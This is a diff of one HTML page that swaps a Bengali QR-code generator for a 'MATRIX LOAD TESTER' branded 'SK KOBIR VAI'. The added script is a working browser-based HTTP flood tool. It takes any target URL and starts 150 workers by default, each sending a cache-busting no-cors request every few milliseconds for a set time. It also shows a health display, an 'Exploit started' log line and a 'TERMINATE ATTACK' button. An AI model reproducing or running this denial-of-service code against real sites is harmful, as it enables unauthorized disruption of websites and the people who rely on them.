@@ -1,74 +1,158 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SK KOBIR VAI - QR PRO</title>
+    <title>SK KOBIR VAI - MATRIX TOOL</title>
     <style>
-        body { text-align: center; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; background-color: #f0f0f0; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h1 { color: #ff0000; font-size: 30px; margin-bottom: 20px; }
-        input { padding: 12px; width: 90%; border: 2px solid #ff0000; border-radius: 10px; font-size: 16px; outline: none; margin-bottom: 20px; }
-        #qrcode { display: flex; justify-content: center; margin-bottom: 25px; padding: 10px; background: #fff; }
-        .btn { background: #ff0000; color: white; border: none; padding: 12px 25px; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
+        * { box-sizing: border-box; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        .terminal { 
+            border: 2px solid #ff0000; width: 95%; max-width: 600px; margin: 30px auto; 
+            padding: 20px; background: rgba(10, 10, 10, 0.9); 
+            border-radius: 10px; box-shadow: 0 0 25px #ff0000;
+            position: relative; z-index: 1;
+        }
+        .brand-name { color: #fff; font-size: 28px; font-weight: bold; margin-bottom: 5px; text-shadow: 0 0 10px #ff0000; }
+        h1 { color: #ff0000; margin-top: 0; text-shadow: 0 0 5px #ff0000; letter-spacing: 2px; font-size: 24px; }
+        .input-group { margin: 15px 0; text-align: left; }
+        label { font-size: 14px; color: #aaa; display: block; margin-bottom: 5px; }
+        input { 
+            width: 100%; padding: 12px; background: rgba(0,0,0,0.7); border: 1px solid #ff0000; 
+            color: #00ff00; font-size: 16px; border-radius: 5px; outline: none; 
+        }
+        .btn-launch { background: #ff0000; color: white; border: none; padding: 15px; width: 100%; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; box-shadow: 0 0 10px red; }
+        .btn-stop { background: #444; color: white; border: none; padding: 15px; width: 100%; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; display: none; }
+        .stats { display: flex; justify-content: space-around; margin-top: 25px; border-top: 1px solid #333; padding-top: 15px; }
+        .val { font-size: 20px; color: #fff; font-weight: bold; display: block; }
+        #log { height: 120px; overflow-y: auto; background: rgba(5, 5, 5, 0.8); color: #00ff00; font-size: 12px; margin-top: 20px; text-align: left; padding: 10px; border: 1px solid #222; border-radius: 5px; }
+        .status-tag { font-size: 20px; margin: 10px; color: yellow; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>SK KOBIR VAI</h1>
-    <input type="text" id="input" placeholder="এখানে নাম বা লিঙ্ক লিখুন..." oninput="gen()">
-    
-    <div id="qrcode"></div>
+<canvas id="matrixCanvas"></canvas>
 
-    <button class="btn" onclick="downloadQR()">📥 ডাউনলোড করুন</button>
+<div class="terminal">
+    <div class="brand-name">SK KOBIR VAI</div>
+    <h1>MATRIX LOAD TESTER</h1>
+    
+    <div class="input-group">
+        <label>TARGET URL:</label>
+        <input type="text" id="targetUrl" placeholder="https://example.com">
+    </div>
+
+    <div style="display: flex; gap: 10px;">
+        <div class="input-group" style="flex: 1;">
+            <label>THREADS:</label>
+            <input type="number" id="threadCount" value="150">
+        </div>
+        <div class="input-group" style="flex: 1;">
+            <label>DURATION (SEC):</label>
+            <input type="number" id="duration" value="60">
+        </div>
+    </div>
+
+    <button class="btn-launch" id="launchBtn" onclick="startSystem()">LAUNCH SYSTEM 🔥</button>
+    <button class="btn-stop" id="stopBtn" onclick="stopSystem()">TERMINATE ATTACK 🛑</button>
+
+    <div class="status-tag" id="mainStatus">SYSTEM IDLE</div>
+
+    <div class="stats">
+        <div class="stat-item">PACKETS<br><span id="totalReq" class="val">0</span></div>
+        <div class="stat-item">WORKERS<br><span id="activeThreads" class="val">0</span></div>
+        <div class="stat-item">HEALTH<br><span id="siteStatus" class="val" style="color: #00ff00;">READY</span></div>
+    </div>
+
+    <div id="log">Console initialized...<br></div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-
 <script>
-    // কিউআর কোড তৈরি করার ফাংশন
-    var q = new QRCode(document.getElementById("qrcode"), {
-        width: 256,
-        height: 256,
-        colorDark : "#000000",
-        colorLight : "#ffffff",
-        correctLevel : QRCode.CorrectLevel.H
-    });
+    // Matrix Animation and Attack Logic follows your provided script...
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()";
+    const fontSize = 15;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
 
-    function gen() {
-        let val = document.getElementById("input").value;
-        q.makeCode(val || "SK KOBIR VAI");
-    }
-    
-    // ডাউনলোড করার ফাংশন
-    function downloadQR() {
-        const qrCanvas = document.querySelector('#qrcode canvas');
-        const qrImg = document.querySelector('#qrcode img');
-        
-        let dataUrl;
-        if (qrCanvas) {
-            dataUrl = qrCanvas.toDataURL("image/png");
-        } else if (qrImg) {
-            dataUrl = qrImg.src;
-        }
-
-        if (dataUrl) {
-            const link = document.createElement('a');
-            link.href = dataUrl;
-            link.download = 'sk-kobir-qr.png';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        } else {
-            alert("আগে কিছু লিখুন ভাই!");
+    function drawMatrix() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0F0";
+        ctx.font = fontSize + "px arial";
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
         }
     }
+    setInterval(drawMatrix, 35);
 
-    // শুরুতে একটি কোড দেখিয়ে রাখা
-    gen();
+    let totalRequests = 0;
+    let isRunning = false;
+    let autoStopTimer;
+
+    function logMessage(msg, color="#00ff00") {
+        const log = document.getElementById('log');
+        log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>` + log.innerHTML;
+        if (log.childNodes.length > 30) log.removeChild(log.lastChild);
+    }
+
+    function startSystem() {
+        const url = document.getElementById('targetUrl').value.trim();
+        const threads = parseInt(document.getElementById('threadCount').value);
+        const dur = parseInt(document.getElementById('duration').value);
+        if (!url.startsWith("http")) { alert("Enter valid URL!"); return; }
+        isRunning = true;
+        document.getElementById('launchBtn').style.display = "none";
+        document.getElementById('stopBtn').style.display = "block";
+        document.getElementById('mainStatus').innerText = "SYSTEM ACTIVE 🚀";
+        logMessage("Exploit started on: " + url, "red");
+        for (let i = 0; i < threads; i++) { setTimeout(() => { runWorker(url); }, i * 2); }
+        document.getElementById('activeThreads').innerText = threads;
+        autoStopTimer = setTimeout(() => { stopSystem("Cycle Finished."); }, dur * 1000);
+        checkHealth(url);
+    }
+
+    function stopSystem(reason = "Attack Aborted.") {
+        isRunning = false;
+        clearTimeout(autoStopTimer);
+        document.getElementById('launchBtn').style.display = "block";
+        document.getElementById('stopBtn').style.display = "none";
+        document.getElementById('mainStatus').innerText = "SYSTEM IDLE";
+        document.getElementById('activeThreads').innerText = "0";
+        logMessage(reason, "yellow");
+    }
+
+    async function runWorker(url) {
+        while (isRunning) {
+            try {
+                fetch(url + "?x=" + Math.random(), { mode: 'no-cors', cache: 'no-store' });
+                totalRequests++;
+                document.getElementById('totalReq').innerText = totalRequests.toLocaleString();
+            } catch (e) {}
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+
+    async function checkHealth(url) {
+        const h = document.getElementById('siteStatus');
+        const itv = setInterval(async () => {
+            if(!isRunning) { clearInterval(itv); return; }
+            try {
+                await fetch(url, { mode: 'no-cors' });
+                h.innerText = "ONLINE"; h.style.color = "#00ff00";
+            } catch (e) {
+                h.innerText = "CRITICAL"; h.style.color = "#ff0000";
+                logMessage("429: TOO MANY REQUESTS", "red");
+            }
+        }, 4000);
+    }
 </script>
-
 </body>
 </html>
